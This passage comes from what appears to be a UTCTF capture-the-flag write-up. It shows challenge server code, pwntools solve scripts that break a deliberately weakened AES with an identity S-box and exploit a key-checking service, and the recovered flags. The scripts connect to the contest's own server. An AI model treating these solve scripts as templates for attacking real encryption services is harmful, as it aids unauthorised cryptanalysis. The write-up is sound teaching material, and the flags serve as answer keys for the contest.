style=color:#ae81ff>46</span>, <span style=color:#ae81ff>47</span>, <span style=color:#ae81ff>48</span>, <span style=color:#ae81ff>49</span>, <span style=color:#ae81ff>50</span>, <span style=color:#ae81ff>51</span>, <span style=color:#ae81ff>52</span>, <span style=color:#ae81ff>53</span>, <span style=color:#ae81ff>54</span>, <span style=color:#ae81ff>55</span>, <span style=color:#ae81ff>56</span>, <span style=color:#ae81ff>57</span>, <span style=color:#ae81ff>58</span>, <span style=color:#ae81ff>59</span>, <span style=color:#ae81ff>60</span>, <span style=color:#ae81ff>61</span>, <span style=color:#ae81ff>62</span>, <span style=color:#ae81ff>63</span>, <span style=color:#ae81ff>64</span>, <span style=color:#ae81ff>65</span>, <span style=color:#ae81ff>66</span>, <span style=color:#ae81ff>67</span>, <span style=color:#ae81ff>68</span>, <span style=color:#ae81ff>69</span>, <span style=color:#ae81ff>70</span>, <span style=color:#ae81ff>71</span>, <span style=color:#ae81ff>72</span>, <span style=color:#ae81ff>73</span>, <span style=color:#ae81ff>74</span>, <span style=color:#ae81ff>75</span>, <span style=color:#ae81ff>76</span>, <span style=color:#ae81ff>77</span>, <span style=color:#ae81ff>78</span>, <span style=color:#ae81ff>79</span>, <span style=color:#ae81ff>80</span>, <span style=color:#ae81ff>81</span>, <span style=color:#ae81ff>82</span>, <span style=color:#ae81ff>83</span>, <span style=color:#ae81ff>84</span>, <span style=color:#ae81ff>85</span>, <span style=color:#ae81ff>86</span>, <span style=color:#ae81ff>87</span>, <span style=color:#ae81ff>88</span>, <span style=color:#ae81ff>89</span>, <span style=color:#ae81ff>90</span>, <span style=color:#ae81ff>91</span>, <span style=color:#ae81ff>92</span>, <span style=color:#ae81ff>93</span>, <span style=color:#ae81ff>94</span>, <span style=color:#ae81ff>95</span>, <span style=color:#ae81ff>96</span>, <span style=color:#ae81ff>97</span>, <span style=color:#ae81ff>98</span>, <span style=color:#ae81ff>99</span>, <span style=color:#ae81ff>100</span>, <span style=color:#ae81ff>101</span>, <span style=color:#ae81ff>102</span>, <span style=color:#ae81ff>103</span>, <span style=color:#ae81ff>104</span>, <span style=color:#ae81ff>105</span>, <span style=color:#ae81ff>106</span>, <span style=color:#ae81ff>107</span>, <span style=color:#ae81ff>108</span>, <span style=color:#ae81ff>109</span>, <span style=color:#ae81ff>110</span>, <span style=color:#ae81ff>111</span>, <span style=color:#ae81ff>112</span>, <span style=color:#ae81ff>113</span>, <span style=color:#ae81ff>114</span>, <span style=color:#ae81ff>115</span>, <span style=color:#ae81ff>116</span>, <span style=color:#ae81ff>117</span>, <span style=color:#ae81ff>118</span>, <span style=color:#ae81ff>119</span>, <span style=color:#ae81ff>120</span>, <span style=color:#ae81ff>121</span>, <span style=color:#ae81ff>122</span>, <span style=color:#ae81ff>123</span>, <span style=color:#ae81ff>124</span>, <span style=color:#ae81ff>125</span>, <span style=color:#ae81ff>126</span>, <span style=color:#ae81ff>127</span>, <span style=color:#ae81ff>128</span>, <span style=color:#ae81ff>129</span>, <span style=color:#ae81ff>130</span>, <span style=color:#ae81ff>131</span>, <span style=color:#ae81ff>132</span>, <span style=color:#ae81ff>133</span>, <span style=color:#ae81ff>134</span>, <span style=color:#ae81ff>135</span>, <span style=color:#ae81ff>136</span>, <span style=color:#ae81ff>137</span>, <span style=color:#ae81ff>138</span>, <span style=color:#ae81ff>139</span>, <span style=color:#ae81ff>140</span>, <span style=color:#ae81ff>141</span>, <span style=color:#ae81ff>142</span>, <span style=color:#ae81ff>143</span>, <span style=color:#ae81ff>144</span>, <span style=color:#ae81ff>145</span>, <span style=color:#ae81ff>146</span>, <span style=color:#ae81ff>147</span>, <span style=color:#ae81ff>148</span>, <span style=color:#ae81ff>149</span>, <span style=color:#ae81ff>150</span>, <span style=color:#ae81ff>151</span>, <span style=color:#ae81ff>152</span>, <span style=color:#ae81ff>153</span>, <span style=color:#ae81ff>154</span>, <span style=color:#ae81ff>155</span>, <span style=color:#ae81ff>156</span>, <span style=color:#ae81ff>157</span>, <span style=color:#ae81ff>158</span>, <span style=color:#ae81ff>159</span>, <span style=color:#ae81ff>160</span>, <span style=color:#ae81ff>161</span>, <span style=color:#ae81ff>162</span>, <span style=color:#ae81ff>163</span>, <span style=color:#ae81ff>164</span>, <span style=color:#ae81ff>165</span>, <span style=color:#ae81ff>166</span>, <span style=color:#ae81ff>167</span>, <span style=color:#ae81ff>168</span>, <span style=color:#ae81ff>169</span>, <span style=color:#ae81ff>170</span>, <span style=color:#ae81ff>171</span>, <span style=color:#ae81ff>172</span>, <span style=color:#ae81ff>173</span>, <span style=color:#ae81ff>174</span>, <span style=color:#ae81ff>175</span>, <span style=color:#ae81ff>176</span>, <span style=color:#ae81ff>177</span>, <span style=color:#ae81ff>178</span>, <span style=color:#ae81ff>179</span>, <span style=color:#ae81ff>180</span>, <span style=color:#ae81ff>181</span>, <span style=color:#ae81ff>182</span>, <span style=color:#ae81ff>183</span>, <span style=color:#ae81ff>184</span>, <span style=color:#ae81ff>185</span>, <span style=color:#ae81ff>186</span>, <span style=color:#ae81ff>187</span>, <span style=color:#ae81ff>188</span>, <span style=color:#ae81ff>189</span>, <span style=color:#ae81ff>190</span>, <span style=color:#ae81ff>191</span>, <span style=color:#ae81ff>192</span>, <span style=color:#ae81ff>193</span>, <span style=color:#ae81ff>194</span>, <span style=color:#ae81ff>195</span>, <span style=color:#ae81ff>196</span>, <span style=color:#ae81ff>197</span>, <span style=color:#ae81ff>198</span>, <span style=color:#ae81ff>199</span>, <span style=color:#ae81ff>200</span>, <span style=color:#ae81ff>201</span>, <span style=color:#ae81ff>202</span>, <span style=color:#ae81ff>203</span>, <span style=color:#ae81ff>204</span>, <span style=color:#ae81ff>205</span>, <span style=color:#ae81ff>206</span>, <span style=color:#ae81ff>207</span>, <span style=color:#ae81ff>208</span>, <span style=color:#ae81ff>209</span>, <span style=color:#ae81ff>210</span>, <span style=color:#ae81ff>211</span>, <span style=color:#ae81ff>212</span>, <span style=color:#ae81ff>213</span>, <span style=color:#ae81ff>214</span>, <span style=color:#ae81ff>215</span>, <span style=color:#ae81ff>216</span>, <span style=color:#ae81ff>217</span>, <span style=color:#ae81ff>218</span>, <span style=color:#ae81ff>219</span>, <span style=color:#ae81ff>220</span>, <span style=color:#ae81ff>221</span>, <span style=color:#ae81ff>222</span>, <span style=color:#ae81ff>223</span>, <span style=color:#ae81ff>224</span>, <span style=color:#ae81ff>225</span>, <span style=color:#ae81ff>226</span>, <span style=color:#ae81ff>227</span>, <span style=color:#ae81ff>228</span>, <span style=color:#ae81ff>229</span>, <span style=color:#ae81ff>230</span>, <span style=color:#ae81ff>231</span>, <span style=color:#ae81ff>232</span>, <span style=color:#ae81ff>233</span>, <span style=color:#ae81ff>234</span>, <span style=color:#ae81ff>235</span>, <span style=color:#ae81ff>236</span>, <span style=color:#ae81ff>237</span>, <span style=color:#ae81ff>238</span>, <span style=color:#ae81ff>239</span>, <span style=color:#ae81ff>240</span>, <span style=color:#ae81ff>241</span>, <span style=color:#ae81ff>242</span>, <span style=color:#ae81ff>243</span>, <span style=color:#ae81ff>244</span>, <span style=color:#ae81ff>245</span>, <span style=color:#ae81ff>246</span>, <span style=color:#ae81ff>247</span>, <span style=color:#ae81ff>248</span>, <span style=color:#ae81ff>249</span>, <span style=color:#ae81ff>250</span>, <span style=color:#ae81ff>251</span>, <span style=color:#ae81ff>252</span>, <span style=color:#ae81ff>253</span>, <span style=color:#ae81ff>254</span>, <span style=color:#ae81ff>255</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Rijndael Inverted S-box</span>
</span></span><span style=display:flex><span>    rsbox <span style=color:#f92672>=</span> [<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>7</span>, <span style=color:#ae81ff>8</span>, <span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>10</span>, <span style=color:#ae81ff>11</span>, <span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>13</span>, <span style=color:#ae81ff>14</span>, <span style=color:#ae81ff>15</span>, <span style=color:#ae81ff>16</span>, <span style=color:#ae81ff>17</span>, <span style=color:#ae81ff>18</span>, <span style=color:#ae81ff>19</span>, <span style=color:#ae81ff>20</span>, <span style=color:#ae81ff>21</span>, <span style=color:#ae81ff>22</span>, <span style=color:#ae81ff>23</span>, <span style=color:#ae81ff>24</span>, <span style=color:#ae81ff>25</span>, <span style=color:#ae81ff>26</span>, <span style=color:#ae81ff>27</span>, <span style=color:#ae81ff>28</span>, <span style=color:#ae81ff>29</span>, <span style=color:#ae81ff>30</span>, <span style=color:#ae81ff>31</span>, <span style=color:#ae81ff>32</span>, <span style=color:#ae81ff>33</span>, <span style=color:#ae81ff>34</span>, <span style=color:#ae81ff>35</span>, <span style=color:#ae81ff>36</span>, <span style=color:#ae81ff>37</span>, <span style=color:#ae81ff>38</span>, <span style=color:#ae81ff>39</span>, <span style=color:#ae81ff>40</span>, <span style=color:#ae81ff>41</span>, <span style=color:#ae81ff>42</span>, <span style=color:#ae81ff>43</span>, <span style=color:#ae81ff>44</span>, <span style=color:#ae81ff>45</span>, <span style=color:#ae81ff>46</span>, <span style=color:#ae81ff>47</span>, <span style=color:#ae81ff>48</span>, <span style=color:#ae81ff>49</span>, <span style=color:#ae81ff>50</span>, <span style=color:#ae81ff>51</span>, <span style=color:#ae81ff>52</span>, <span style=color:#ae81ff>53</span>, <span style=color:#ae81ff>54</span>, <span style=color:#ae81ff>55</span>, <span style=color:#ae81ff>56</span>, <span style=color:#ae81ff>57</span>, <span style=color:#ae81ff>58</span>, <span style=color:#ae81ff>59</span>, <span style=color:#ae81ff>60</span>, <span style=color:#ae81ff>61</span>, <span style=color:#ae81ff>62</span>, <span style=color:#ae81ff>63</span>, <span style=color:#ae81ff>64</span>, <span style=color:#ae81ff>65</span>, <span style=color:#ae81ff>66</span>, <span style=color:#ae81ff>67</span>, <span style=color:#ae81ff>68</span>, <span style=color:#ae81ff>69</span>, <span style=color:#ae81ff>70</span>, <span style=color:#ae81ff>71</span>, <span style=color:#ae81ff>72</span>, <span style=color:#ae81ff>73</span>, <span style=color:#ae81ff>74</span>, <span style=color:#ae81ff>75</span>, <span style=color:#ae81ff>76</span>, <span style=color:#ae81ff>77</span>, <span style=color:#ae81ff>78</span>, <span style=color:#ae81ff>79</span>, <span style=color:#ae81ff>80</span>, <span style=color:#ae81ff>81</span>, <span style=color:#ae81ff>82</span>, <span style=color:#ae81ff>83</span>, <span style=color:#ae81ff>84</span>, <span style=color:#ae81ff>85</span>, <span style=color:#ae81ff>86</span>, <span style=color:#ae81ff>87</span>, <span style=color:#ae81ff>88</span>, <span style=color:#ae81ff>89</span>, <span style=color:#ae81ff>90</span>, <span style=color:#ae81ff>91</span>, <span style=color:#ae81ff>92</span>, <span style=color:#ae81ff>93</span>, <span style=color:#ae81ff>94</span>, <span style=color:#ae81ff>95</span>, <span style=color:#ae81ff>96</span>, <span style=color:#ae81ff>97</span>, <span style=color:#ae81ff>98</span>, <span style=color:#ae81ff>99</span>, <span style=color:#ae81ff>100</span>, <span style=color:#ae81ff>101</span>, <span style=color:#ae81ff>102</span>, <span style=color:#ae81ff>103</span>, <span style=color:#ae81ff>104</span>, <span style=color:#ae81ff>105</span>, <span style=color:#ae81ff>106</span>, <span style=color:#ae81ff>107</span>, <span style=color:#ae81ff>108</span>, <span style=color:#ae81ff>109</span>, <span style=color:#ae81ff>110</span>, <span style=color:#ae81ff>111</span>, <span style=color:#ae81ff>112</span>, <span style=color:#ae81ff>113</span>, <span style=color:#ae81ff>114</span>, <span style=color:#ae81ff>115</span>, <span style=color:#ae81ff>116</span>, <span style=color:#ae81ff>117</span>, <span style=color:#ae81ff>118</span>, <span style=color:#ae81ff>119</span>, <span style=color:#ae81ff>120</span>, <span style=color:#ae81ff>121</span>, <span style=color:#ae81ff>122</span>, <span style=color:#ae81ff>123</span>, <span style=color:#ae81ff>124</span>, <span style=color:#ae81ff>125</span>, <span style=color:#ae81ff>126</span>, <span style=color:#ae81ff>127</span>, <span style=color:#ae81ff>128</span>, <span style=color:#ae81ff>129</span>, <span style=color:#ae81ff>130</span>, <span style=color:#ae81ff>131</span>, <span style=color:#ae81ff>132</span>, <span style=color:#ae81ff>133</span>, <span style=color:#ae81ff>134</span>, <span style=color:#ae81ff>135</span>, <span style=color:#ae81ff>136</span>, <span style=color:#ae81ff>137</span>, <span style=color:#ae81ff>138</span>, <span style=color:#ae81ff>139</span>, <span style=color:#ae81ff>140</span>, <span style=color:#ae81ff>141</span>, <span style=color:#ae81ff>142</span>, <span style=color:#ae81ff>143</span>, <span style=color:#ae81ff>144</span>, <span style=color:#ae81ff>145</span>, <span style=color:#ae81ff>146</span>, <span style=color:#ae81ff>147</span>, <span style=color:#ae81ff>148</span>, <span style=color:#ae81ff>149</span>, <span style=color:#ae81ff>150</span>, <span style=color:#ae81ff>151</span>, <span style=color:#ae81ff>152</span>, <span style=color:#ae81ff>153</span>, <span style=color:#ae81ff>154</span>, <span style=color:#ae81ff>155</span>, <span style=color:#ae81ff>156</span>, <span style=color:#ae81ff>157</span>, <span style=color:#ae81ff>158</span>, <span style=color:#ae81ff>159</span>, <span style=color:#ae81ff>160</span>, <span style=color:#ae81ff>161</span>, <span style=color:#ae81ff>162</span>, <span style=color:#ae81ff>163</span>, <span style=color:#ae81ff>164</span>, <span style=color:#ae81ff>165</span>, <span style=color:#ae81ff>166</span>, <span style=color:#ae81ff>167</span>, <span style=color:#ae81ff>168</span>, <span style=color:#ae81ff>169</span>, <span style=color:#ae81ff>170</span>, <span style=color:#ae81ff>171</span>, <span style=color:#ae81ff>172</span>, <span style=color:#ae81ff>173</span>, <span style=color:#ae81ff>174</span>, <span style=color:#ae81ff>175</span>, <span style=color:#ae81ff>176</span>, <span style=color:#ae81ff>177</span>, <span style=color:#ae81ff>178</span>, <span style=color:#ae81ff>179</span>, <span style=color:#ae81ff>180</span>, <span style=color:#ae81ff>181</span>, <span style=color:#ae81ff>182</span>, <span style=color:#ae81ff>183</span>, <span style=color:#ae81ff>184</span>, <span style=color:#ae81ff>185</span>, <span style=color:#ae81ff>186</span>, <span style=color:#ae81ff>187</span>, <span style=color:#ae81ff>188</span>, <span style=color:#ae81ff>189</span>, <span style=color:#ae81ff>190</span>, <span style=color:#ae81ff>191</span>, <span style=color:#ae81ff>192</span>, <span style=color:#ae81ff>193</span>, <span style=color:#ae81ff>194</span>, <span style=color:#ae81ff>195</span>, <span style=color:#ae81ff>196</span>, <span style=color:#ae81ff>197</span>, <span style=color:#ae81ff>198</span>, <span style=color:#ae81ff>199</span>, <span style=color:#ae81ff>200</span>, <span style=color:#ae81ff>201</span>, <span style=color:#ae81ff>202</span>, <span style=color:#ae81ff>203</span>, <span style=color:#ae81ff>204</span>, <span style=color:#ae81ff>205</span>, <span style=color:#ae81ff>206</span>, <span style=color:#ae81ff>207</span>, <span style=color:#ae81ff>208</span>, <span style=color:#ae81ff>209</span>, <span style=color:#ae81ff>210</span>, <span style=color:#ae81ff>211</span>, <span style=color:#ae81ff>212</span>, <span style=color:#ae81ff>213</span>, <span style=color:#ae81ff>214</span>, <span style=color:#ae81ff>215</span>, <span style=color:#ae81ff>216</span>, <span style=color:#ae81ff>217</span>, <span style=color:#ae81ff>218</span>, <span style=color:#ae81ff>219</span>, <span style=color:#ae81ff>220</span>, <span style=color:#ae81ff>221</span>, <span style=color:#ae81ff>222</span>, <span style=color:#ae81ff>223</span>, <span style=color:#ae81ff>224</span>, <span style=color:#ae81ff>225</span>, <span style=color:#ae81ff>226</span>, <span style=color:#ae81ff>227</span>, <span style=color:#ae81ff>228</span>, <span style=color:#ae81ff>229</span>, <span style=color:#ae81ff>230</span>, <span style=color:#ae81ff>231</span>, <span style=color:#ae81ff>232</span>, <span style=color:#ae81ff>233</span>, <span style=color:#ae81ff>234</span>, <span style=color:#ae81ff>235</span>, <span style=color:#ae81ff>236</span>, <span style=color:#ae81ff>237</span>, <span style=color:#ae81ff>238</span>, <span style=color:#ae81ff>239</span>, <span style=color:#ae81ff>240</span>, <span style=color:#ae81ff>241</span>, <span style=color:#ae81ff>242</span>, <span style=color:#ae81ff>243</span>, <span style=color:#ae81ff>244</span>, <span style=color:#ae81ff>245</span>, <span style=color:#ae81ff>246</span>, <span style=color:#ae81ff>247</span>, <span style=color:#ae81ff>248</span>, <span style=color:#ae81ff>249</span>, <span style=color:#ae81ff>250</span>, <span style=color:#ae81ff>251</span>, <span style=color:#ae81ff>252</span>, <span style=color:#ae81ff>253</span>, <span style=color:#ae81ff>254</span>, <span style=color:#ae81ff>255</span>]
</span></span></code></pre></div><p>The Sbox defined is actually equivalent to nothing, making the entire AES encryption process equivalent to an Affine function (see challenge name).</p><p><code>encrypt_pub.py</code> is the server code, and all it does is encrypt via the broken AES.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> aes <span style=color:#f92672>import</span> AES
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>key <span style=color:#f92672>=</span> <span style=color:#f92672>&lt;</span>REDACTED<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;plaintext hex string: &#34;</span>, end<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    msg <span style=color:#f92672>=</span> bytes<span style=color:#f92672>.</span>fromhex(input())
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> len(msg) <span style=color:#f92672>%</span> <span style=color:#ae81ff>16</span> <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>        msg <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>16</span> <span style=color:#f92672>-</span> (len(msg) <span style=color:#f92672>%</span> <span style=color:#ae81ff>16</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    ciphertext <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>    aes <span style=color:#f92672>=</span> AES()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(msg), <span style=color:#ae81ff>16</span>):
</span></span><span style=display:flex><span>        msgblock <span style=color:#f92672>=</span> msg[i:i<span style=color:#f92672>+</span><span style=color:#ae81ff>16</span>]
</span></span><span style=display:flex><span>        cipherblock <span style=color:#f92672>=</span> bytes(aes<span style=color:#f92672>.</span>encrypt(msgblock, key, <span style=color:#ae81ff>16</span>))
</span></span><span style=display:flex><span>        ciphertext <span style=color:#f92672>+=</span> cipherblock
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(ciphertext<span style=color:#f92672>.</span>hex())
</span></span></code></pre></div><p>This type of challenge has definitely appeared before, so I won&rsquo;t go into detail. Here&rsquo;s a <a href=https://crypto.stackexchange.com/questions/67612/aes-oracle-with-bad-s-box>helpful link</a>
if you want to look into it more.</p><p>I also have an exact copy of the challenge solved <a href=https://github.com/flocto/writeups/blob/main/imaginaryCTF/round30/aes2/solve.py>here</a>.</p><p>Actually I wasted about 2 hours on this challenge even though I literally already solved it before, because I thought the master key was the flag ðŸ˜‚.</p><p>Anyway here&rsquo;s the final solve:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>from</span> aes <span style=color:#f92672>import</span> AES
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> remote
</span></span><span style=display:flex><span><span style=color:#75715e># nc puffer.utctf.live 52584</span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;puffer.utctf.live&#39;</span>, int(<span style=color:#ae81ff>52584</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>secret <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;3384f87f781c394b79e331510540a4125a371b057b058d8e793521cd43f2ae94&#39;</span>
</span></span><span style=display:flex><span>secret <span style=color:#f92672>=</span> bytes<span style=color:#f92672>.</span>fromhex(secret)
</span></span><span style=display:flex><span>s_chunks <span style=color:#f92672>=</span> [secret[i:i<span style=color:#f92672>+</span><span style=color:#ae81ff>16</span>] <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(secret), <span style=color:#ae81ff>16</span>)]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;plaintext hex string:&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;0&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>32</span> <span style=color:#f92672>*</span> len(s_chunks))
</span></span><span style=display:flex><span>k <span style=color:#f92672>=</span> bytes<span style=color:#f92672>.</span>fromhex(r<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>decode())
</span></span><span style=display:flex><span>print(k<span style=color:#f92672>.</span>hex())
</span></span><span style=display:flex><span>k_chunks <span style=color:#f92672>=</span> [k[i:i<span style=color:#f92672>+</span><span style=color:#ae81ff>16</span>] <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(k), <span style=color:#ae81ff>16</span>)]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(s_chunks)
</span></span><span style=display:flex><span>print(k_chunks)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>aes <span style=color:#f92672>=</span> AES()
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> k, s <span style=color:#f92672>in</span> zip(k_chunks, s_chunks):
</span></span><span style=display:flex><span>    block <span style=color:#f92672>=</span> list([a <span style=color:#f92672>^</span> b <span style=color:#66d9ef>for</span> a, b <span style=color:#f92672>in</span> zip(k, s)])
</span></span><span style=display:flex><span>    temp <span style=color:#f92672>=</span> [<span style=color:#ae81ff>0</span>] <span style=color:#f92672>*</span> <span style=color:#ae81ff>16</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> k <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>4</span>):
</span></span><span style=display:flex><span>        <span style=color:#75715e># iterate over the rows</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> l <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>4</span>):
</span></span><span style=display:flex><span>            temp[(k<span style=color:#f92672>*</span><span style=color:#ae81ff>4</span>)<span style=color:#f92672>+</span>l] <span style=color:#f92672>=</span> block[(k<span style=color:#f92672>+</span>(l<span style=color:#f92672>*</span><span style=color:#ae81ff>4</span>))]
</span></span><span style=display:flex><span>    block <span style=color:#f92672>=</span> temp
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    orig <span style=color:#f92672>=</span> aes<span style=color:#f92672>.</span>aes_invMain(block, [<span style=color:#ae81ff>0</span>] <span style=color:#f92672>*</span> <span style=color:#ae81ff>176</span>, <span style=color:#ae81ff>10</span>)
</span></span><span style=display:flex><span>    temp <span style=color:#f92672>=</span> [<span style=color:#ae81ff>0</span>] <span style=color:#f92672>*</span> <span style=color:#ae81ff>16</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>4</span>):
</span></span><span style=display:flex><span>        <span style=color:#75715e># iterate over the rows</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> j <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>4</span>):
</span></span><span style=display:flex><span>            temp[(i<span style=color:#f92672>+</span>(j<span style=color:#f92672>*</span><span style=color:#ae81ff>4</span>))] <span style=color:#f92672>=</span> orig[(i<span style=color:#f92672>*</span><span style=color:#ae81ff>4</span>)<span style=color:#f92672>+</span>j]
</span></span><span style=display:flex><span>    orig <span style=color:#f92672>=</span> temp
</span></span><span style=display:flex><span>    flag <span style=color:#f92672>+=</span> bytes(orig)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(flag)
</span></span></code></pre></div><p>Flag is <code>utflag{5O_Th3_5B0x_d035_m4tt3R!}</code></p><p><a href=#toc>Back to TOC</a></p><h3 id=looks-wrong-tom-e>Looks Wrong tom E</h3><p><strong>Points: 993</strong></p><blockquote><p>everything about this challenge looks wrong&mldr;</p><p>there are now 2 flags for this challenge btw so try submitting on the other one if this one doesn&rsquo;t work</p><p>also this does mean that the source is lying to you a little bit ;)</p><p>By oops (@oops on discord)</p><p><code>nc puffer.utctf.live 8484</code></p></blockquote><p>This one is cheese, just feed the server 0s and it will give you the flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> remote
</span></span><span style=display:flex><span><span style=color:#75715e># nc puffer.utctf.live 8484</span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;puffer.utctf.live&#39;</span>, <span style=color:#ae81ff>8484</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> round <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>11</span>):
</span></span><span style=display:flex><span>    size <span style=color:#f92672>=</span> <span style=color:#ae81ff>10</span><span style=color:#f92672>*</span>min(round, <span style=color:#ae81ff>5</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;how many keys would you like? (1-10)&#39;</span>, str(<span style=color:#ae81ff>1</span>)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;which key would you like to crack? (1-1)&#39;</span>, str(<span style=color:#ae81ff>1</span>)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    inj <span style=color:#f92672>=</span> [<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;0&#39;</span>] <span style=color:#f92672>*</span> size 
</span></span><span style=display:flex><span>    inj <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39; &#39;</span><span style=color:#f92672>.</span>join(inj)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;enter the secret key (</span><span style=color:#e6db74>%d</span><span style=color:#e6db74> space separated integers)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>%</span> size)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendline(inj)
</span></span><span style=display:flex><span>    print(r<span style=color:#f92672>.</span>recvline())
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>interactive()
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;crypto&#34;&#34;&#34;</span>
</span></span></code></pre></div><p><code>utflag{mY_l34Rn1Ng_h4s_3rr0rs_2f11a84e}</code></p><p><a href=#toc>Back to TOC</a></p><h3 id=provably-insecure>Provably Insecure</h3><p><strong>Points: 993</strong></p><blockquote><p>I&rsquo;m sure nobody remembers the fiasco from DiceCTF when I thought I had proven my cipher was secure. Can you fool this signature service?</p><p>By Jeriah (@jyu on Discord)</p><p><code>nc puffer.utctf.live 52548</code></p><p><a href=files/provably%20insecure/server.py>server.py</a></p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#75715e>#!/usr/local/bin/python</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> cryptography.hazmat.primitives.asymmetric <span style=color:#f92672>import</span> rsa
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> secrets <span style=color:#f92672>import</span> randbits
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
